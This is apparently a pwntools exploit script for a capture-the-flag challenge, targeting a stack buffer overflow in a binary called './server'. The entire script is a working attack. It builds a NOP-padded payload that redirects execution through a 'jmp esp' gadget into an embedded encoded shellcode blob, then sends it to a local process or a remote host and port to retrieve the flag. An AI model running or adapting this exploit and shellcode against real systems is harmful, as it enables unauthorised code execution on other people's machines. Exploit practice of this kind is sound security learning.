from pwn import *


# Allows easy swapping betwen local/remote/debug modes
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
# init-pwndbg
# set follow-fork-mode child
# source /home/mor/pwndbg/gdbinit.py
# source /home/mor/.gdbinit-gef.py
# set follow-fork-mode child
b *0x080491dc
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './server'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
# context.log_level = 'debug'


io = start()

shellcode =  b""
shellcode += b"\xbd\x79\x45\xfe\x99\xdb\xd6\xd9\x74\x24\xf4\x58\x33"
shellcode += b"\xc9\xb1\x12\x83\xc0\x04\x31\x68\x10\x03\x68\x10\x9b"
shellcode += b"\xb0\x15\xaf\xe3\x3e\xea\xd0\x13\x1a\xdb\x19\xde\x1c"
shellcode += b"\x92\x59\x58\x1f\xa5\x5d\x98\xa9\x42\xd4\x61\x13\x8c"
shellcode += b"\xf7\x91\x64\x40\x77\x18\xa6\xe2\x7c\x1a\x27\x13\xc6"
shellcode += b"\x18\x27\x13\x38\xd1\xa7\xab\x39\xe9\xa7\xcb\x82\xe9"
shellcode += b"\xa7\xcb\xf4\x24\x27\x23\x31\x49\xd7\x4b\xdc\xd9\x49"
shellcode += b"\xd3\x0f\x55\xf2\x6f\x50"

# Build the payload
payload = flat([
    asm('nop')*76,
    next(elf.search(asm('jmp esp'), executable=True)),
    asm('nop')*16,
    shellcode,
    # asm(shellcraft.cat('flag.txt')),
    # # asm(shellcraft.sh()),
    # asm(shellcraft.exit()),
])

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter(b':', payload)


# Get flag
# io.interactive()
io.wait()
print(io.recvall().decode())
